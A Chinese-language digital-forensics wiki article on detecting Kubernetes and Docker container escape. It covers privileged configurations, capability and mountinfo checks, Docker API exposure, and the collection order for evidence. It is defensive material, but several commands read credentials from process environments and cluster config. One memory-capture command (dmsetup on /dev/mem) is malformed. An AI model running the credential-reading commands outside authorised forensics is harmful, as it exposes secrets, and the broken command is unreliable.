---
title: "容器逃逸与运行时痕迹"
slug: "server-k8s-container-escape-and-runtime-artifacts"
canonical: "https://www.digiforensics.cn/wiki/server-k8s-container-escape-and-runtime-artifacts"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:51+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "server"
space: "服务器与云取证"
node_path: ["Kubernetes"]
---

# 容器逃逸与运行时痕迹

> 原文链接：[DigiForensics Wiki · 在线阅读](https://www.digiforensics.cn/wiki/server-k8s-container-escape-and-runtime-artifacts)

<a id="section-1"></a>

## 一、概述

在案件里，"容器里出现了宿主机的东西"往往比"容器里跑着恶意程序"更能定性。

因为容器逃逸类案件的定罪关键从来不是"容器内有什么恶意文件"，而是"**攻击者是否离开了容器原有的隔离边界**"。一旦突破，宿主机上的所有数据都进入攻击范围，后续的横向与持久化痕迹也才得以解释。

本篇把这类案件拆成三个层次：

| 层次 | 要回答的问题 | 主要证据面 |
|---|---|---|
| **① 隔离状态** | 事发时这个容器**本来**是不是被削弱了隔离？ | `docker inspect` 的 `HostConfig`、Pod spec、审计日志 `requestObject` |
| **② 突破痕迹** | 宿主机上**有没有**容器不该有的访问痕迹？ | `/proc` 下的 namespace/capability 差异、宿主机新文件、cgroup 异常 |
| **③ 持久化** | 攻击者**如何**在重建后活下来？ | DaemonSet、静态 Pod、镜像层改写、`/etc/systemd` |

本篇最需要反复强调的一点：容器内改动默认只存在于 upperdir，随 `docker rm` 一起消失（见 [Docker 取证工件地图](../server-docker/server-docker-docker-artifact-map.md)）。

因此对逃逸类案件，**应优先保存易失的运行态证据**——停止或删除容器可能使相关进程、连接和隔离边界状态无法复查。

**必须先内存、后状态、最后文件系统。**

**在取证流程中的位置**：本篇属于**分析环的判定层**，跨采集与分析两环：它既要抢易失证据（第 1 步），又要在固定下来的配置与状态里做判定。

它与前面几篇的分工是明确的——[镜像层与 overlay2 解析](../server-docker/server-docker-overlay2.md) 告诉你层里有什么，[Volume 与绑定挂载取证](../server-docker/server-docker-docker-volumes-and-bind-mounts.md) 告诉你数据落在哪，本篇告诉你这些配置组合起来危不危险、运行时是不是真的被削弱了。

**涉及的证据形态**（四道隔离边界，每道都有可观测点）：

| 边界 | 机制 | 观察点 |
|---|---|---|
| 命名空间 | mount / pid / net / uts / ipc / user | `/proc/<pid>/ns/*` 的 inode 号；`mountinfo` 里是否出现宿主机路径 |
| Capability | 裁剪进程能力集 | `/proc/self/status` 的 `CapEff`——`0000003fffffffff` = 全集 |
| cgroup | CPU / 内存 / PIDs / 设备 | `/proc/<pid>/cgroup` 路径层级，**v1 与 v2 格式完全不同** |
| 只读根 + Seccomp + LSM | rofs、seccomp、AppArmor/SELinux | `mountinfo` 中 `/` 的挂载选项；`Seccomp: 0` 与 `NoNewPrivs: 0` |

> **`CapEff` 是最有价值的一行**：正常应用容器的 capability 集合通常只有十几项，看到 `0000003fffffffff` 就说明这个进程拥有全部能力。Linux 引入 capability 机制后，**判断"是否特权"不再需要猜。**

**高危配置清单（本篇最需要交付给委托方的一张表）**：这些是"把隔离关掉"的**配置选择，不是漏洞**。判定依据全在 `HostConfig` 与 Pod spec 里——`--privileged`（所有隔离全部关闭，★★★★★）、`hostPath` 挂载（挂 `/` 即交出根权限，★★★★★）、挂载 `docker.sock`（持有 Docker API 完全控制权，★★★★★）、挂载宿主 `/etc/kubernetes`（可读 kubelet 凭据与 PKI，★★★★★）、`--device=/dev/sda`（可直读宿主机磁盘，★★★★★）、`--cap-add=SYS_ADMIN`、`--pid=host`（可读 `/proc/*/environ` 取凭据）、`--net=host`（直连 localhost 上的数据库）、`kind: DaemonSet`（每个节点都跑一份的持久化载体）、静态 Pod（绕过 API Server 与调度）。

Docker API 暴露（2375 端口）必须单独说：`2375` 是明文、无认证的 TCP 端口。只要它在监听且可达，任何人都能创建特权容器、挂载宿主机根目录、读取任意文件——不需要任何漏洞。 `daemon.json` 里的 `hosts` 字段是**直接证据，比推断"是否被利用"更可靠**。

事发时这个容器的隔离配置是什么、哪些边界被削弱了、宿主机上有没有容器不该有的访问痕迹、攻击者用哪种方式活了下来。

**配置高危不等于被利用**——这是本领域最高频的误判方向。`--privileged` 可能是一开始就为调试而开，DaemonSet 可能是运维部署的。配置说明的是"具备条件"，突破痕迹才说明"实际发生了"，两者必须分开表述。另一个边界是：`/proc` 侧的观察需要容器仍在运行，**已删除容器的隔离状态只能从残留配置推断**。

**内容边界（本篇的红线）**：只写**防守侧的检测与排除误报**——如何识别高危配置、如何判断突破痕迹、如何区分正常运维与攻击行为。不提供任何逃逸实现、不涉及提权方法、不给出突破隔离的具体操作步骤。 涉及 Docker API、capability、namespace 时，止步于"这个配置意味着什么、怎么观察到"。

**读者前提**：需要 Linux 的 namespace / capability / cgroup 机制（见 [proc 虚拟文件系统取证](../../computer/computer-shell/computer-shell-proc.md)）、容器运行时基础，以及 [Docker 取证工件地图](../server-docker/server-docker-docker-artifact-map.md) 与 [镜像层与 overlay2 解析](../server-docker/server-docker-overlay2.md) 的前置知识。如果主机还在线，强烈建议先读 [3.1 第 1 步](#section-11)——**采集延迟可能导致运行态证据丢失。**
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 容器隔离的四道边界

理解"逃逸"必须先理解容器究竟靠什么把进程关住。这四道边界任意一道被配置削弱或被绕过，就可能脱离容器。

| 边界 | 机制 | 取证时的观察点 |
|---|---|---|
| **命名空间** | mount / pid / net / uts / ipc / user | `/proc/<pid>/ns/*` 的 inode 号；`/proc/self/mountinfo` 里是否出现宿主机路径 |
| **Capability** | 裁剪进程能力集 | `/proc/self/status` 的 `CapEff`（`0000003fffffffff` = 全集，含 `CAP_SYS_ADMIN`） |
| **cgroup 资源限制** | CPU / 内存 / PIDs / 设备 | `/proc/<pid>/cgroup` 路径层级 |
| **只读根 + Seccomp + LSM** | rofs、seccomp、AppArmor/SELinux | `/proc/self/mountinfo` 中 `/` 的挂载选项；`/sys/kernel/security/apparmor` |

**`CapEff` 是最有价值的一行**。一个正常运行的应用容器，其 capability 集合通常只有十几项；而看到 `CapEff: 0000003fffffffff` 就说明这个进程拥有全部能力——这几乎总是"以特权方式运行"的直接证据。Linux 引入 **capability** 机制后（`/proc/sys/kernel/cap_last_cap` 显示当前上限），判断"是否特权"不再需要猜。

```bash
# 容器内执行：CapEff 全为 f 即拥有全部 capability
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status
# CapInh: 0000000000000000
# CapPrm: 0000003fffffffff   ← ★ 全集
# CapEff: 0000003fffffffff   ← ★ 全集 = 特权运行
# NoNewPrivs: 0
# Seccomp: 0                 ← ★ 0 = 未启用 seccomp 过滤
```

> ⚠️ `Seccomp: 0` 与 `NoNewPrivs: 0` 同时出现要单独记录。 默认的非特权容器通常有 `Seccomp: 2`（filter 模式）。seccomp 被关闭会让 syscall 面大幅放开，这是"配置本应安全、实际被削弱"的直接证据。

<a id="section-4"></a>

### 2.2 cgroup 路径：判断"我在哪"与"我是谁"

`/proc/self/cgroup` 是区分"进程在容器内"与"在宿主机上"最省事的手段，因为容器运行时必然把它写进 cgroup 路径。

```bash
# 容器内：路径里带容器 ID
cat /proc/self/cgroup
# 12:memory:/docker/6d4f7b2c1a9b...           ← ★ cgroup v1 风格
# 0::/system.slice/docker-6d4f7b2c1a9b...scope ← cgroup v2 风格

# kubelet 管理的容器：
# 0::/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod<uid>.slice/...

# 宿主机上：路径里没有容器标识
cat /proc/self/cgroup | grep -qE 'docker|kubepods|containerd|crio' && echo "在容器内" || echo "在宿主机"
```

| 观察结果 | 含义 |
|---|---|
| 路径含 `docker-<id>` 或 `/kubepods` | **该进程在容器内** |
| 路径含 `system.slice` 且无容器标识 | **在宿主机系统作用域** |
| **容器内却读到宿主机根 cgroup 路径** | ★ 强烈提示 hostPID/hostcgroup 被共享，或该进程已在宿主机上下文运行 |

**cgroup 版本差异**必须注意：cgroup v1 有 `memory:`、`cpu:` 等十余条层级，v2 统一为 `0::` 单行。v2 下 `docker-<id>.scope` 结尾的容器 ID 是 64 位十六进制，可用于与 `docker inspect` 的容器 ID 前缀比对。

<a id="section-5"></a>

### 2.3 mountinfo：能不能看到宿主机，是最直观的判据

`/proc/self/mountinfo` 列出当前 mount namespace 内**所有**挂载点。普通容器里它只有二十几行；逃逸到宿主机的进程会看到宿主机真实文件系统。

```bash
wc -l < /proc/self/mountinfo          # ★ 行数是最快的分界参考

# 找宿主机特有的挂载点（容器内不应出现）
grep -E ' / /(ext4|xfs|btrfs) | /boot | /etc/kubernetes | /var/lib/docker | /home ' /proc/self/mountinfo

# 检查是否挂载了宿主机目录
grep -E 'docker\.sock|containerd\.sock|/var/lib/kubelet|/etc/kubernetes' /proc/self/mountinfo

# 是否看到宿主机块设备
ls /dev/ | head -20
lsblk 2>/dev/null
```

> ⚠️ `/proc/self/mountinfo` 里出现 `/var/lib/docker` 或 `/etc/kubernetes`，几乎可以断定是 hostPath 挂载或已逃逸到宿主机。 但要注意区分两种情况：**配置层面**的 hostPath（`docker inspect` 里有 `HostConfig.Binds`）与**运行结果**的挂载（mountinfo 里有）要分别取证，前者证明"被配置成高危"，后者证明"确实被访问过"。

<a id="section-6"></a>

### 2.4 高危配置清单：哪些参数等于"等于没隔离"

这是本文最需要交付给委托方的一张表。**这些是"把隔离关掉"的配置选择，不是漏洞。**

| 配置 | 在哪里看 | 隔离后果 | 风险等级 |
|---|---|---|---|
| **`--privileged`** | `HostConfig.Privileged=true` | **所有隔离全部关闭**：cap 全集、禁用 seccomp、启用所有设备、AppArmor 转 unconfined | ★★★★★ |
| **`--cap-add=SYS_ADMIN`** | `HostConfig.CapAdd` | 获得可挂载、管理 cgroup、改 namespace 的大部分能力 | ★★★★☆ |
| **`--pid=host`** | `HostConfig.PidMode="host"` | **可见宿主机全部进程**（可读 `/proc/*/environ` 取环境变量与凭据） | ★★★★☆ |
| **`--net=host`** | `HostConfig.NetworkMode="host"` | **直接使用宿主机网络栈**，可访问 localhost 上的数据库/管理端口 | ★★★★☆ |
| **`--ipc=host`** | `HostConfig.IpcMode="host"` | 共享宿主机 IPC，可与宿主机进程交换数据 | ★★★☆☆ |
| **`--uts=host`** | `HostConfig.UTSMode="host"` | 共享主机名等 UTS 信息，影响有限但仍是配置失当 | ★★☆☆☆ |
| **`hostPath` 挂载** | `HostConfig.Binds` / Pod `volumes[].hostPath` | **等于把宿主机目录的读写权交给容器**；挂 `/` 即等于交出根权限 | ★★★★★ |
| **挂载 docker.sock** | `Binds` 含 `/var/run/docker.sock` | **持有 Docker API 的完全控制权**，可创建任意特权容器 | ★★★★★ |
| **挂载宿主 `/etc/kubernetes`** | `hostPath.path` | 可读 kubelet 凭据与 PKI，集群控制面失守 | ★★★★★ |
| `--security-opt seccomp=unconfined` | `HostConfig.SecurityOpt` | 关闭系统调用过滤 | ★★★☆☆ |
| **`--device=/dev/sda`** | `HostConfig.Devices` | **可直读宿主机磁盘块设备** | ★★★★★ |
| **`--user 0` + root** | `Config.User` 为空或 `0` | 容器内即 root，配合任何上述能力都会放大后果 | ★★★☆☆ |

**K8s 侧对应项**：

| Pod 字段 | 等价含义 | 取证路径 |
|---|---|---|
| `spec.containers[].securityContext.privileged: true` | `--privileged` | 审计日志 `requestObject`；`/var/lib/kubelet/pods/<uid>/config.yaml` |
| `spec.hostNetwork / hostPID / hostIPC: true` | 同上三项 | 审计日志 `requestObject` |
| `spec.volumes[].hostPath.path` | **把宿主机路径交给容器** | 审计日志；`configmap`/静态 Pod 清单 |
| `spec.volumes[].hostPath.path: /var/run/docker.sock` | Docker API 控制权 | 同上 |
| `kind: DaemonSet` | **每个节点都跑一份的持久化载体** | `kubectl get ds -A` |
| 静态 Pod（`/etc/kubernetes/manifests/`） | kubelet 直接拉起，绕过 API Server 与调度 | 见[第 04 篇](server-k8s-kubernetes-artifact-map.md) |
| `spec.nodeName` 被手工指定且带 `hostPID` | 直接落地到具体节点 | 审计日志 |
| `runtimeClassName` 指向自定义 runtime | 可能使用非标准隔离配置 | `kubectl get runtimeclass` |
| `serviceAccount` + `automountServiceAccountToken: true` | SA token 泄露影响面（见[第 05 篇](server-k8s-configmap-secret.md)） | Pod spec |

<a id="section-7"></a>

### 2.5 Docker API 暴露：暴露即等于宿主机 root

`2375` 是 Docker 的**明文、无认证** TCP 端口；`2376` 是 TLS 版本。只要 2375 在监听且可达，任何人都能创建特权容器、挂载宿主机根目录、读取任意文件——不需要任何漏洞。

```bash
# 宿主机侧：是否监听
ss -lntp | grep -E ':2375|:2376'
# ★ 出现 0.0.0.0:2375 即为高危配置

# 配置来源
grep -nE '"hosts"' /etc/docker/daemon.json
systemctl show docker | grep -i execstart

# 是否有 TLS 校验
ls -l /etc/docker/certs.d/ 2>/dev/null
```

**取证意义**：`daemon.json` 里的 `hosts` 字段是**直接证据**，比推断"是否被利用"更可靠。若审计显示有来自外部的 `create`/`start` 容器请求，**则说明该端口曾被实际使用**。

> ⚠️ **区分"配置了"与"被利用了"**：`daemon.json` 里写了 `0.0.0.0:2375` 只能证明配置失当；证明被利用需要网络侧日志（防火墙/IDS/云厂商流量审计）、容器创建记录（`/var/lib/docker/containers/*/config.v2.json`）与镜像拉取记录三者至少两项相互印证。

<a id="section-8"></a>

### 2.6 运行时痕迹：containerd-shim 与 runc 状态

从 Docker 迁移到 containerd 的环境里，宿主机上会残留大量 `containerd-shim` 与 `runc` 相关痕迹，它们是容器"曾经运行过"的时间证据。

| 痕迹 | 位置 | 取证意义 |
|---|---|---|
| **`containerd-shim` 进程** | `ps` / `/proc/*/cmdline` | ★ **每个运行中的容器对应一个 shim**。**注意：shim 启动后会主动 re-parent 到 PID 1（init/systemd），`PPID` 通常是 1 而不是 containerd**——这是设计使然（让容器不依赖 containerd 存活）。**shim 数量 ≥ 运行中容器数**，不是相等：pause/infra 容器、已退出未回收的 shim 都会让计数偏大；**精确计数应改用 `/run/containerd/io.containerd.runtime.v2.task/*/*/log.jsonl` 的文件数** |
| **shim 的 cwd 与 rootfs** | `/proc/<shim-pid>/cwd`、`/proc/<shim-pid>/root` | 指向 `/run/containerd/io.containerd.runtime.v2.task/<ns>/<id>`，**可反查容器 ID** |
| **runc 状态目录** | `/run/containerd/io.containerd.runtime.v2.task/<ns>/<id>/` | 含 `log.jsonl`（**该容器的完整生命周期日志**） |
| **cgroup 残留** | `/sys/fs/cgroup/.../docker-<id>.scope` | 容器删除后 cgroup 可能仍在，**说明删除不彻底** |
| **运行时 socket** | `/run/docker.sock`、`/run/containerd/containerd.sock`、`/var/run/crio/crio.sock` | **存在即可被挂载进容器** |
| **namespace 残留** | `/proc/<pid>/ns/*` 的 inode | 同一 inode = 同一 namespace，**共享 namespace 的容器即可互相看到** |

```bash
# 运行中的容器对应的 shim
# ★ 注意 PPID 通常是 1（shim 主动 re-parent 到 init，不挂在 containerd 下）——
#   看到 PPID=1 是正常现象，不要据此判断"父进程缺失"或"容器被孤立"。
ps -ef | grep '[c]ontainerd-shim' | head -20

# ★ 精确统计容器数用 log.jsonl，而不是数 shim 进程
#   （pause/infra 容器与未回收 shim 会让 shim 计数偏大）
find /run/containerd/io.containerd.runtime.v2.task -name log.jsonl 2>/dev/null | wc -l

# 由 shim 反查容器 ID 与 rootfs
for p in $(pgrep -f containerd-shim); do
  echo "shim $p  cwd=$(readlink /proc/$p/cwd 2>/dev/null)"
done

# runc 生命周期日志（★ 记录 create/start/delete 的完整过程）
ls -l /run/containerd/io.containerd.runtime.v2.task/*/*/log.jsonl 2>/dev/null

# 残留 cgroup
find /sys/fs/cgroup -maxdepth 4 -name 'docker-*.scope' 2>/dev/null | head

# ★ 运行时 socket 是否存在
ls -l /run/docker.sock /run/containerd/containerd.sock 2>/dev/null
```

> ⚠️ `log.jsonl` 与容器生命周期日志容易被运维清理。 在 `/run` 下（tmpfs，重启即失）必须**第一时间固定**；`/var/lib/docker/containers/<id>/<id>-json.log`（json-file 驱动）虽在磁盘上，但会随 `docker rm` 删除。**这是容器取证的"双重时间窗"**（详见[第 01 篇](../server-docker/server-docker-docker-artifact-map.md)）。

<a id="section-9"></a>

### 2.7 K8s 层的异常形态

| 异常 | 为什么高危 | 检查方式 |
|---|---|---|
| **特权 Pod** | 见 2.4 | 审计日志 `requestObject`；`kubectl get pod -A -o json` |
| **hostPath 挂载 `/`** | 宿主机根目录写权限 | 同上，grep `"path":"/"` |
| **DaemonSet** | **每个节点都跑一份，是最常见的 K8s 持久化载体** | `kubectl get ds -A -o wide` |
| 异常 ClusterRoleBinding 指向 cluster-admin | 提权后行为的容器 | `kubectl get clusterrolebinding -o json`；见[第 05 篇](server-k8s-configmap-secret.md) |
| **静态 Pod** | 绕过 API Server 与调度器，kubelet 直接拉起；API 审计可能记录不全 | `/etc/kubernetes/manifests/*.yaml` |
| Pod 指定了 `nodeName` 但无对应控制器 | 手工落地的"影子 Pod" | 审计日志中 `create pods` 的 `requestObject.spec.nodeName` |
| **镜像来源异常** | 私库直连 IP、`:5000`、可变 tag `latest` | 审计日志 `requestObject.spec.containers[].image` |
| 容器内无 `imagePullPolicy: Always` 却用 `latest` | 节点缓存导致"实际运行版本≠声明版本" | Pod spec 与节点缓存镜像 digest 比对 |
| **`imagePullSecrets` 异常** | 拉取凭证被滥用 | Secret 审计（见[第 05 篇](server-k8s-configmap-secret.md)） |

---

<a id="section-10"></a>

## 三、操作步骤

<a id="section-11"></a>

### 3.1 第 1 步：★ 抢时间——先做易失采集

**这一步做晚了，第 2~5 步做的全部都是残缺的。** 顺序不可调换。

```bash
# 1.1 宿主机内存（★ 最先，最易失）
sudo insmod ./LiME/linux-memory-x64.ko path=/mnt/evidence/mem.lime
# 或
sudo cat /proc/kcore > /mnt/evidence/mem.raw          # 体积巨大，慎用
dmsetup create df_mem --table "0 $(( $(stat -c%s /dev/mem) / 512 )) 0"   # 逐段采集

# 1.2 容器状态快照（★ 必须在 docker stop / rm 之前）
docker ps -a --no-trunc --format '{{.ID}}\	{{.Names}}\	{{.Image}}\	{{.Status}}\	{{.Command}}' \
  | tee /evidence/docker/ps-a.txt
docker inspect $(docker ps -aq) > /evidence/docker/inspect-all.json
docker diff  digiforensics-app > /evidence/docker/diff-digiforensics-app.txt
docker logs --timestamps --tail -1 digiforensics-app > /evidence/docker/logs-tail.txt

# 1.3 运行时易失状态（/run 是 tmpfs，重启即失）
sudo tar czf /mnt/evidence/run-containerd.tgz \
  /run/containerd /run/docker.sock /run/crio 2>/dev/null
ps -ef > /mnt/evidence/ps-ef.txt
sudo cp -a /proc/*/cmdline /mnt/evidence/ 2>/dev/null   # 视需要，见 3.5

# 1.4 审计日志（体量大，优先取时段）
cp -p /var/log/kubernetes/audit.log* /evidence/k8s/ 2>/dev/null

# 1.5 再做磁盘镜像（★ 最后一步）
lsblk -f /dev/sda
dd if=/dev/sda of=/mnt/evidence/DigiForensics.dd bs=4M status=progress conv=noerror,sync
```

<a id="section-12"></a>

### 3.2 第 2 步：容器隔离配置面取证

```bash
# 逐个容器的隔离参数（★ HostConfig 是核心）
docker inspect digiforensics-app \
  | python3 -c "
import json,sys
c=json.load(sys.stdin)[0]; h=c.get('HostConfig') or {}
for k in ('Privileged','CapAdd','CapDrop','PidMode','NetworkMode','IpcMode',
          'UTSMode','SecurityOpt','Devices','UsernsMode','CgroupnsMode','ReadonlyRootfs'):
    print(f'{k:18} = {h.get(k)}')
print('---')
for b in h.get('Binds') or []:
    print('Bind               =', b)
for m in h.get('Mounts') or []:
    print('Mount              =', m.get('Type'), m.get('Source'), '->', m.get('Destination'), 'RW=', m.get('RW'))
"
```

**高危项速筛**：

```bash
docker inspect $(docker ps -aq) | python3 -c "
import json,sys
RISK = {
 'Privileged=true':'隔离全关','CapAdd含SYS_ADMIN':'能力过授',
 'PidMode=host':'可见宿主机进程','NetworkMode=host':'共享宿主机网络',
 'IpcMode=host':'共享宿主机IPC'}
for c in json.load(sys.stdin):
    h=c.get('HostConfig') or {}; tag=c.get('Id','')[:12]
    for k,v in RISK.items():
        key,val=k.split('=')
        if str(h.get(key))==val: print(f'[{tag}] {k}  ← {v}')
    for cap in h.get('CapAdd') or []:
        if 'SYS_ADMIN' in str(cap).upper(): print(f'[{tag}] CapAdd={cap}  ← 能力过授')
    for b in (h.get('Binds') or []):
        if any(x in b for x in ('/var/run/docker.sock','containerd.sock','/:/','/etc/kubernetes')):
            print(f'[{tag}] Binds={b}  ← ★ 宿主机高危挂载')
"
```

<a id="section-13"></a>

### 3.3 第 3 步：容器内的隔离状态实测

**这一步只能在容器还活着时做**（`docker exec` 会改变容器状态，见[第 04 篇](server-k8s-kubernetes-artifact-map.md)）。优先用 `docker cp` 把下面的脚本拷进去执行，或从镜像里已有的工具读取，尽量不改动原容器。

```bash
# 脚本内容（离线可跑，无外部依赖）
cat > /tmp/container-selfcheck.sh <<'EOF'
#!/bin/sh
echo "=== 1. 是否在容器内（cgroup 路径）==="
cat /proc/self/cgroup
echo
echo "=== 2. Capability 与 seccomp ==="
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status
echo
echo "=== 3. mountinfo 规模与宿主机痕迹 ==="
wc -l < /proc/self/mountinfo
grep -E ' / /(ext4|xfs|btrfs) | /boot | /etc/kubernetes | /var/lib/docker | /home ' /proc/self/mountinfo
echo
echo "=== 4. 运行时 socket / 设备 / proc 视图 ==="
ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>/dev/null
ls /dev/ | tr '\
' ' '; echo
echo "可见 PID 数：$(ls /proc | grep -cE '^[0-9]+$')"
echo
echo "=== 5. 网络视图（hostNetwork 会看到宿主机接口）==="
ip -o addr show 2>/dev/null | awk '{print $2, $4}'
echo
echo "=== 6. 容器内用户与敏感文件 ==="
id
cat /etc/hostname
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
EOF
docker cp /tmp/container-selfcheck.sh digiforensics-app:/tmp/selfcheck.sh
docker exec digiforensics-app sh /tmp/selfcheck.sh | tee /evidence/container-selfcheck.txt
```

**判读表**：

| 输出 | 判读 |
|---|---|
| `CapEff: 0000003fffffffff` | **特权运行**（能力全集） |
| `Seccomp: 0` | **未启用系统调用过滤** |
| `NoNewPrivs: 0` | 未禁止提权位 |
| mountinfo 出现 `/var/lib/docker`、`/etc/kubernetes` | **hostPath 挂载或已逃逸** |
| mountinfo 出现 `/` 且文件系统为 `ext4`/`xfs` | **可见宿主机根文件系统** |
| 存在 `docker.sock` / `containerd.sock` | **持有运行时 API 控制权（最高危）** |
| 可见 PID 数远大于容器内进程数 | **`--pid=host`**，可见宿主机全部进程 |
| `ip addr` 出现宿主机业务网卡 | **`--net=host`** |
| `/var/run/secrets/kubernetes.io/serviceaccount/` 存在 | K8s 环境，token 泄露影响面见[第 05 篇](server-k8s-configmap-secret.md) |

<a id="section-14"></a>

### 3.4 第 4 步：宿主机侧的突破痕迹

```bash
# 4.1 Docker API 暴露
grep -nE '"hosts"|2375' /etc/docker/daemon.json
ss -lntp | grep -E ':2375|:2376'
systemctl cat docker | grep -i execstart

# 4.2 近期创建的容器（★ 逃逸后常新建临时容器）
docker ps -a --no-trunc --format '{{.CreatedAt}}\	{{.Names}}\	{{.Image}}\	{{.Command}}' | sort | tail -20
find /var/lib/docker/containers -name 'config.v2.json' -newermt '2024-03-01' | head -20

# 4.3 异常挂载与镜像
find /var/lib/docker/volumes -maxdepth 2 -name '_data' -newermt '2024-03-01'
find /var/lib/docker/overlay2 -maxdepth 2 -name 'diff' -type d -newermt '2024-03-01' | head

# 4.4 逃逸后常见的落地位置（★ 只做只读检查，不做任何修复）
ls -la /root/.ssh/ /etc/cron.d/ /var/spool/cron/ 2>/dev/null
find /etc/systemd/system /usr/lib/systemd/system -name '*.service' -newermt '2024-03-01'
find / -xdev -type f -perm -4000 -newermt '2024-03-01' 2>/dev/null | head -20   # 新增 SUID
grep -rE 'docker\.sock|containerd\.sock' /etc/cron* /var/spool/cron /root/.bashrc 2>/dev/null

# 4.5 容器相关持久化（对照[《Linux 计划任务与持久化痕迹》](../../computer/computer-persistence/computer-persistence-scheduled-tasks-and-persistence.md)的宿主持久化清单）
# 容器场景的持久化载体是：镜像层改写 / named volume / 宿主 cron 重启容器
# 宿主 cron 里出现 docker start/run 即为容器持久化
crontab -l 2>/dev/null; cat /etc/crontab /etc/cron.d/* 2>/dev/null
```

<a id="section-15"></a>

### 3.5 第 5 步：进程与 namespace 侧交叉验证

若怀疑有容器共享了 namespace（这本身是高危配置），可以按 namespace inode 反查进程。

```bash
# 列出所有容器的 pid namespace inode
for p in $(ls /proc | grep -E '^[0-9]+$'); do
  ns=$(readlink /proc/$p/ns/pid 2>/dev/null)
  [ -n "$ns" ] && echo "$ns $p $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | cut -c1-60)"
done | sort | awk '{print $1}' | uniq -c | sort -rn | head

# 同一 namespace 下出现了不同容器 ID 的进程 → 共享了 pid namespace
# 读取进程环境变量（★ 可能含 DB 口令、API Key；须授权后脱敏）
sudo tr '\0' '\
' < /proc/<pid>/environ | grep -E 'PASS|SECRET|TOKEN|KEY'

# 读取进程的工作目录与已打开文件（★ 逃逸痕迹的直接体现）
sudo ls -l /proc/<pid>/cwd /proc/<pid>/root /proc/<pid>/exe
sudo ls -l /proc/<pid>/fd 2>/dev/null | grep -vE 'socket|pipe|anon_inode'
```

> ⚠️ `/proc/<pid>/environ` 是双刃剑：它是证明"凭据已被进程读取"的直接证据，但**其中的凭据一旦进入分析机就会扩散**。必须**在授权的隔离环境内提取、立即脱敏、单独编号**，报告中只写"某进程环境变量中存在数据库口令（已脱敏）"。

<a id="section-16"></a>

### 3.6 第 6 步：K8s 侧的高危配置清点

```bash
export KUBECONFIG=/etc/kubernetes/admin.conf

# 6.1 特权 Pod 与 hostPath（★ 全集群扫描）
kubectl get pods -A -o json | python3 -c "
import json,sys
for p in json.load(sys.stdin)['items']:
    s=p['spec']; ns=p['metadata']['namespace']; n=p['metadata']['name']
    hp=[v['hostPath']['path'] for v in s.get('volumes') or [] if 'hostPath' in v]
    priv=[c['name'] for c in s.get('containers') or []
          if (c.get('securityContext') or {}).get('privileged')]
    flags=[k for k in ('hostNetwork','hostPID','hostIPC') if s.get(k)]
    if hp or priv or flags:
        print(f'{ns}/{n}  hostNamespace={flags}  privileged={priv}  hostPath={hp}')
"
# digiforensics/audit-shim  hostNamespace=['hostPID']  privileged=['shim']  hostPath=['/']

# 6.2 DaemonSet（★ 最常见的 K8s 持久化载体）
kubectl get ds -A -o wide
kubectl get ds -A -o json | python3 -c "
import json,sys
for d in json.load(sys.stdin)['items']:
    t=d['spec']['template']['spec']
    priv=any((c.get('securityContext') or {}).get('privileged') for c in t.get('containers') or [])
    hp=[v['hostPath']['path'] for v in t.get('volumes') or [] if 'hostPath' in v]
    imgs=[c.get('image') for c in t.get('containers') or []]
    print(f\"{d['metadata']['namespace']}/{d['metadata']['name']}  创建={d['metadata']['creationTimestamp']}  privileged={priv}  hostPath={hp}\")
    print('   镜像:', imgs)
"

# 6.3 静态 Pod（★ 绕过 API Server，审计可能记录不全）
ls -l /mnt/df/etc/kubernetes/manifests/
grep -H 'privileged\|hostPath\|hostNetwork\|hostPID\|image:' /mnt/df/etc/kubernetes/manifests/*.yaml

# 6.4 异常 RBAC
kubectl get clusterrolebinding -o json | python3 -c "
import json,sys
for b in json.load(sys.stdin)['items']:
    if b.get('roleRef',{}).get('name') in ('cluster-admin','edit'):
        for s in b.get('subjects') or []:
            print(f\"{b['metadata']['name']}  → {b['roleRef']['name']}  ← {s.get('kind')}/{s.get('namespace','-')}/{s.get('name')}\")
"

# 6.5 镜像来源异常
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\
"}{end}' \
  | sort -u | grep -vE '^registry\.local/digiforensics/' | head -20
# ★ 10.8.3.90:5000/dumper:latest   ← 直连 IP:端口，典型异常
# ★ xinchen/myapp:latest           ← 公网或不明私库
```

> ⚠️ 静态 Pod 在 `kubectl get pods` 中以 `kube-system-<name>-<node>` 的镜像 Pod 形式出现，`metadata.ownerReferences` 指向 `Node`。 因此"API Server 里查不到定义，但 Pod 在运行"就是静态 Pod 的判定特征。取证时必须直接读 `/etc/kubernetes/manifests/`，不能只依赖 `kubectl`。

<a id="section-17"></a>

### 3.7 第 7 步：验证环节

| 验证对象 | 方法 | 通过标准 |
|---|---|---|
| 内存采集时机 | 采集时间早于 `docker stop/rm` | **早于任何生命周期变更** |
| 隔离配置 | `HostConfig` 与 Pod spec 全量导出 | 每条高危配置有原文对应 |
| 容器内隔离状态 | `CapEff`、`Seccomp`、`mountinfo`、PID 数 | 逐项记录，异常项单独说明 |
| Docker API 暴露 | `daemon.json` + `ss -lntp` | 配置与监听状态一致 |
| 运行时残留 | shim 进程 / `log.jsonl` / cgroup 残留 | 与容器数量、时间线可对齐 |
| 宿主机突破痕迹 | 新增 SUID、cron、systemd unit、authorized_keys | 与时间窗吻合 |
| K8s 高危形态 | 特权 Pod、DaemonSet、静态 Pod、异常 RBAC | 全部清点成表 |
| 证据边界 | 阴性发现是否写明范围 | **"未发现"必须限定范围与时段** |

---

<a id="section-18"></a>

## 四、常见陷阱

容器取证的特殊性在于：**很多操作本身就是破坏**。这一章分四组：**破坏性操作**（不可逆）、**配置误读**（结论方向错）、**环境识别错误**（数据取错地方）、**结论表述**（阴性发现怎么写）。

<a id="section-19"></a>

### 4.1 破坏性操作——不可逆

